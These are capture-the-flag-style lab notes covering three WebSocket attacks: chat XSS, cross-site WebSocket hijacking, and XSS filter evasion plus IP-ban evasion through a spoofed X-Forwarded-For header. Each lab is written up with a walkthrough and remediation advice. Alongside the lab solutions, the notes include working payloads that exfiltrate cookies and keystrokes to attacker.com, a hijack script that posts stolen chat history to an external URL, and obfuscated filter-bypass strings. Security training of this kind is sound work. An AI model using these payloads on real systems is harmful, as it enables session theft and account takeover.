# 🧠 Lab-1 WEBSOCKET XSS (LIVE CHAT) — COMPLETE NOTES

## 📌 1️⃣ OVERVIEW

This lab demonstrates a WebSocket-based XSS vulnerability where:

Attacker injects malicious payload into a WebSocket message → server forwards it → executed in another user's browser

It combines: 

- Real-time communication (WebSockets)
- Client-side vulnerability (XSS)
- Lack of server-side sanitization

## 📌 2️⃣ WHAT IS THE TOPIC?

### 🧩 Core concepts:

- WebSockets (persistent connection)
- Message interception & manipulation
- Stored/Reflected XSS via WebSockets
- Client-side encoding bypass

### 🧩 Goal:

Trigger `alert()` in support agent’s browser using WebSocket message

## 📌 3️⃣ VULNERABILITY IDEA

The app:

- Uses WebSockets for chat
- Sends messages like:

```json
{"message":"Hello"}
```

Displays them in another user's browser

Problem:

Server does NOT sanitize message content before rendering

## 📌 4️⃣ KEY OBSERVATION

When you typed `<` in browser:

```json
{"message":"&lt;"}
```

👉 Means:

Client is encoding input before sending

## 📌 5️⃣ CORE BYPASS

Use Burp to modify message AFTER encoding → send raw payload

## 📌 6️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

### 🟢 Step 1 — Open Live Chat

Send normal message:

```text
hello
```

### 🟢 Step 2 — Identify WebSocket traffic

Go to:

```text
Proxy → WebSockets history
```

Find:

```json
{"message":"hello"}
```

### 🟢 Step 3 — Turn OFF intercept (important)

Let connection establish normally

### 🟢 Step 4 — Turn ON intercept

After connection is stable:

```text
Proxy → Intercept → ON
```

### 🟢 Step 5 — Send another message

Burp intercepts:

```json
{"message":"test"}
```

### 🟢 Step 6 — Modify payload

Replace with:

```json
{"message":"<img src=1 onerror=alert(1)>"}
```

But in proxy not in repeater because WHY REPEATER FAILED (IMPORTANT INSIGHT)

### ❌ Repeater:

Creates new WebSocket connection → breaks session

### ✅ Proxy:

Uses live connection → real exploitation works

Click Forward

## 📸 Screenshot — WebSocket XSS Payload Modified in Proxy

![websocket-xss-proxy-payload](../images/websocket-xss-proxy-payload.png)

### 🟢 Step 7 — Observe result

`alert()` popup appears → lab solved

## 📌 7️⃣ FINAL PAYLOAD

```json
{"message":"<img src=1 onerror=alert(1)>"}
```

## 📌 8️⃣ PAYLOAD BREAKDOWN

### 🧩 `<img src=1>`

Invalid image → triggers error

### 🧩 `onerror=alert(1)`

JavaScript executes when image fails

### 🧩 Result

Code executes in victim (support agent) browser

## 📌 0️⃣ ATTACK FLOW (REAL MODEL)

```text
Attacker sends malicious message
    ↓
Server receives and forwards
    ↓
Support agent browser renders message
    ↓
JavaScript executes (XSS)
```

## 📌 1️⃣ REAL-WORLD SCENARIOS (VERY IMPORTANT)

### 🧨 1. Customer support systems

- Attacker sends malicious message
- Support agent dashboard executes script
- Session hijack

### 🧨 2. Admin chat panels

- XSS in admin browser
- Full system compromise

### 🧨 3. Live collaboration apps

Inject scripts into shared workspace

### 🧨 4. Trading dashboards / fintech

- Inject fake UI
- steal sensitive data

## 📌 2️⃣ HIGH-VALUE TARGETS

- Admin panels
- Support dashboards
- Internal tools
- Monitoring systems

## 📌 3️⃣ 100% REAL-WORLD VARIATIONS

### 🔥 Variation 1 — Cookie stealing

```json
{"message":"<img src=1 onerror='fetch(`https://attacker.com?c=`+document.cookie)'>"}
```

### 🔥 Variation 2 — Keylogger

```json
{"message":"<script>document.onkeypress=e=>fetch('https://attacker.com?k='+e.key)</script>"}
```

### 🔥 Variation 3 — Fake login injection

```json
{"message":"<form action='attacker.com'>Fake login</form>"}
```

### 🔥 Variation 4 — CSRF chaining

XSS triggers hidden requests automatically

### 🔥 Variation 5 — Multi-user propagation

Message spreads → infects multiple users

## 📌 4️⃣ MULTI-CHAIN ATTACK MODEL

```text
WebSocket message → XSS → session theft → privilege escalation → full takeover
```

## 📌 5️⃣ REMEDIATION

### 🛡️ 1. Server-side sanitization

Escape HTML before rendering

### 🛡️ 2. Output encoding

Convert `< >` into safe characters

### 🛡️ 3. Content Security Policy (CSP)

Block inline scripts

### 🛡️ 4. Validate WebSocket input

Treat all messages as untrusted

## 📌 6️⃣ KEY MINDSET

WebSockets are just live APIs — every message is an attack surface

## 🔥 FINAL SUMMARY

This lab shows how intercepting and modifying a WebSocket message allows an attacker to bypass client-side encoding and inject a malicious XSS payload that executes in another user's browser in real time.

If you want next, I can give you:

👉 “WebSocket attack cheat sheet (payloads + patterns to solve labs instantly)”

---

# 🧠 Lab-2 CROSS-SITE WEBSOCKET HIJACKING (CSWSH) — COMPLETE NOTES

## 📌 1️⃣ OVERVIEW

This lab demonstrates a Cross-Site WebSocket Hijacking (CSWSH) attack where:

- The attacker tricks a victim into opening a malicious page
- That page silently creates a WebSocket connection to the target site
- The victim’s session cookies are automatically included
- The attacker retrieves sensitive chat history
- Credentials are leaked → Account takeover

## 📌 2️⃣ WHAT IS THIS TOPIC? (CSWSH)

### 🔴 Definition:

Cross-Site WebSocket Hijacking = abusing WebSocket connections without proper authentication or origin validation

### 🧠 Core idea:

Browser allows WebSocket connections cross-origin → cookies auto-attach → server trusts it → attacker hijacks session

## 📌 3️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

### 🟢 Step 1 — Generate WebSocket traffic

Open lab

Click Live chat

Send:

```text
hello
```

### 🟢 Step 2 — Identify sensitive command

Go to:

```text
Proxy → WebSockets history
```

Find:

```text
READY
```

### 🧠 Meaning:

READY command retrieves full chat history

### 🟢 Step 3 — Capture WebSocket URL

Go to:

```text
Proxy → HTTP history
```

Find handshake:

```http
GET /chat HTTP/1.1
Upgrade: websocket
```

Copy URL:

```text
https://YOUR-LAB-ID.web-security-academy.net/chat
```

Convert:

```text
wss://YOUR-LAB-ID.web-security-academy.net/chat
```

### 🟢 Step 4 — Create exploit (Exploit Server)

```html
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR-URL', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
</script>
```

### 🟢 Step 5 — Add Collaborator

Go to Burp → Collaborator

Copy URL

Replace in payload

### 🟢 Step 6 — Test exploit

Click View exploit

Poll Collaborator

👉 You will see:

```text
Chat messages exfiltrated
```

### 🟢 Step 7 — Deliver to victim

Click Deliver exploit to victim

Poll Collaborator again

👉 You get:

```text
Victim chat history
→ Contains username & password
```

### 🟢 Step 8 — Login

Use stolen credentials → Lab solved ✅

## 📌 4️⃣ FINAL PAYLOAD

```html
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR-URL', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
</script>
```

## 📌 5️⃣ PAYLOAD BREAKDOWN

### 🔹 `new WebSocket(...)`

Creates connection to target using victim session

### 🔹 `ws.onopen`

Triggered when connection is established

```javascript
ws.send("READY");
```

👉 Forces server to send chat history

### 🔹 `ws.onmessage`

Triggered when server sends data

```javascript
fetch(...)
```

👉 Sends stolen data to attacker server

### 🔹 `mode: no-cors`

Bypasses browser CORS restrictions silently

## 📌 6️⃣ REAL-WORLD SCENARIOS (100% Practical)

### 🔴 Scenario 1 — Customer Support Chat

- User chats with support
- Credentials or tokens appear in messages
- Attacker steals full chat → account takeover

### 🔴 Scenario 2 — Admin Dashboards

- Admin panels using WebSockets
- Logs / alerts streamed
- Attacker hijacks → gets sensitive data

### 🔴 Scenario 3 — Trading / Crypto Platforms

- Real-time updates via WebSockets
- Attacker hijacks → steals transaction data

### 🔴 Scenario 4 — Internal Tools

- Employee chat systems
- Internal messages leaked

## 📌 7️⃣ VARIATIONS OF ATTACK

### 🔹 1. Silent Data Exfiltration

Steal messages without user knowing

### 🔹 2. Active Injection

Send malicious messages via `ws.send()`

### 🔹 3. Token Leakage

Extract JWT/session tokens from messages

### 🔹 4. Persistent Monitoring

Keep connection open → real-time spying

## 📌 8️⃣ MULTI-CHAIN ATTACK POSSIBILITIES

### 🔗 Chain 1 — CSWSH → Credential Theft → Account Takeover

### 🔗 Chain 2 — CSWSH → XSS Payload Injection

### 🔗 Chain 3 — CSWSH → Admin Access → Full System Compromise

### 🔗 Chain 4 — CSWSH + Clickjacking

- Trick victim to open exploit page
- Auto-run WebSocket hijack

## 📌 9️⃣ ROOT CAUSE (WHY IT WORKS)

### ❌ No Origin Validation

Server does not check request origin

### ❌ No CSRF Protection

WebSocket handshake has no CSRF token

### ❌ Cookies Auto-Sent

Browser sends session cookies automatically

### ❌ Dangerous Commands

`READY` exposes full chat history

## 📌 🔟 REMEDIATION (DEFENSE)

### 🟢 1. Validate Origin Header

```http
Origin: https://trusted-site.com
```

Reject others.

### 🟢 2. Use CSRF Tokens in Handshake

Require token before allowing WebSocket actions

### 🟢 3. Authentication per Message

Do not trust connection alone

### 🟢 4. Restrict Sensitive Commands

`READY` should require authorization

### 🟢 5. SameSite Cookies

```http
Set-Cookie: session=xyz; SameSite=Strict
```

## 📌 1️⃣1️⃣ MENTAL MODEL (VERY IMPORTANT)

```text
Victim browser = your proxy
WebSocket = tunnel
READY = data dump trigger
fetch() = data exfiltration
```

## 🔥 FINAL ONE-LINE SUMMARY

You trick the victim’s browser into opening a WebSocket connection and force it to leak sensitive data to you.

If you want next, I can:

👉 compare **CSRF vs CSWSH vs Clickjacking (very important exam concept)**  
👉 or give you **real bug bounty examples where this exact attack was used**

---

# 🧠Lab-3 WEBSOCKETS XSS WITH FILTER BYPASS + HANDSHAKE MANIPULATION — COMPLETE NOTES

## 📌 1️⃣ OVERVIEW

This lab demonstrates a combined WebSocket attack involving:

XSS filter bypass + IP ban bypass via handshake manipulation

👉 You:

- Inject XSS into WebSocket messages
- Get blocked & banned ❌
- Bypass ban using handshake
- Bypass filter using obfuscation
- Successfully execute XSS ✅

## 📌 2️⃣ WHAT IS THE TOPIC?

### 🧩 Core Concepts:

- WebSockets (persistent connection)
- WebSocket message manipulation
- XSS (Cross-Site Scripting)
- Filter bypass techniques
- WebSocket handshake manipulation
- Header-based trust flaws

## 📌 3️⃣ LAB GOAL

Trigger `alert()` in support agent’s browser using WebSocket message

## 📌 4️⃣ VULNERABILITY BREAKDOWN

### 🧨 1. XSS vulnerability

- Chat messages rendered in another user's browser
- No proper sanitization

### 🧨 2. Weak XSS filter

Blocks simple payloads like:

```html
<img src=1 onerror='alert(1)'>
```

But fails against obfuscation

### 🧨 3. IP-based blocking flaw

Blocks attacker after detecting malicious payload

Trusts:

```http
X-Forwarded-For
```

👉 Easily spoofed

## 📌 5️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

### 🟢 Step 1 — Open Live Chat

Send:

```text
hello
```

### 🟢 Step 2 — Capture WebSocket message

Go to:

```text
Proxy → WebSockets history
```

Find:

```json
{"message":"hello"}
```

### 🟢 Step 3 — Send to Repeater

Right-click → Send to Repeater

### 🟢 Step 4 — Test basic XSS (FAIL)

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

### ❌ Result:

- Payload blocked
- Connection terminated
- IP banned

## 📌 6️⃣ BYPASS IP BAN (HANDSHAKE ATTACK)

### 🟢 Step 5 — Click Reconnect → FAIL

### 🟢 Step 6 — Modify handshake

Click ✏️ and add:

```http
X-Forwarded-For: 1.1.1.1
```

### 🟢 Step 7 — Click Connect

Connection restored as fake IP ✅

## 📌 7️⃣ BYPASS XSS FILTER

### ❌ Blocked payload:

```html
<img src=1 onerror='alert(1)'>
```

### ✅ Final payload:

```html
<img src=1 oNeRrOr=alert`1`>
```

### 🟢 Step 8 — Send payload

```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

### 💥 Step 9 — Result

`alert()` triggered → LAB SOLVED

## 📌 8️⃣ FINAL PAYLOAD

```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

## 📌 9️⃣ PAYLOAD BREAKDOWN

### 🧩 `<img src=1>`

Invalid image → triggers error

### 🧩 `oNeRrOr`

Case bypass → avoids filter

### 🧩 `alert\`1\``

Uses backticks instead of parentheses

Avoids detection

### 🧩 Result

JavaScript executes in victim browser

## 📌 🔟 HANDSHAKE ATTACK BREAKDOWN

### 🧩 Original:

```http
GET /chat
Cookie: session=xyz
```

### 🧩 Modified:

```http
GET /chat
Cookie: session=xyz
X-Forwarded-For: 1.1.1.1
```

### 🧠 Effect:

Server thinks you are a new IP → ban bypassed

## 📌 1️⃣1️⃣ ATTACK FLOW

```text
1. Send message
2. Try XSS → blocked
3. Get IP banned
4. Modify handshake (fake IP)
5. Reconnect
6. Send obfuscated XSS
7. Payload executes in victim browser
```

## 📌 1️⃣2️⃣ REAL-WORLD SCENARIOS

### 🧨 1. Customer support dashboards

- Attacker sends payload
- Agent executes script
- Session hijack

### 🧨 2. Admin chat systems

XSS → admin takeover

### 🧨 3. Moderation tools

Inject malicious scripts into moderator UI

### 🧨 4. SaaS live collaboration apps

Spread payload across users

## 📌 1️⃣3️⃣ HIGH-VALUE TARGETS

- Admin panels
- Support dashboards
- Internal monitoring tools
- CRM systems

## 📌 1️⃣4️⃣ 100% REAL-WORLD VARIATIONS

### 🔥 Variation 1 — Advanced filter bypass

```html
<img src=x oNerror=confirm`XSS`>
```

### 🔥 Variation 2 — Cookie exfiltration

```html
<img src=1 oNeRrOr=fetch`https://attacker.com?c=${document.cookie}`>
```

### 🔥 Variation 3 — DOM injection

```html
<script>document.body.innerHTML="Hacked"</script>
```

### 🔥 Variation 4 — Silent background requests

```html
<img src=1 oNeRrOr=fetch`/delete-account`>
```

### 🔥 Variation 5 — Multi-user propagation

Payload spreads through chat → infects multiple users

## 📌 1️⃣5️⃣ MULTI-CHAIN ATTACK MODEL

```text
WebSocket XSS → session theft → privilege escalation → full account takeover
```

## 📌 1️⃣6️⃣ REMEDIATION

### 🛡️ 1. Proper output encoding

Escape all user input before rendering

### 🛡️ 2. Strong XSS filtering

Use allowlists, not regex blacklists

### 🛡️ 3. Do NOT trust headers

Ignore `X-Forwarded-For` for security decisions

### 🛡️ 4. Rate limiting & smarter blocking

Avoid simple IP-based bans

### 🛡️ 5. Content Security Policy (CSP)

Prevent script execution

## 📌 1️⃣7️⃣ MENTAL MODEL

```text
WebSocket = Live API
Handshake = Identity check
Message = Attack vector
```

## 🔥 FINAL SUMMARY

This lab shows how an attacker can bypass a weak XSS filter using payload obfuscation and bypass IP-based blocking by manipulating the WebSocket handshake, ultimately achieving XSS execution in another user's browser.

If you want next, I can give you:

👉 “Complete XSS filter bypass cheat sheet (real-world payload patterns hackers use)”
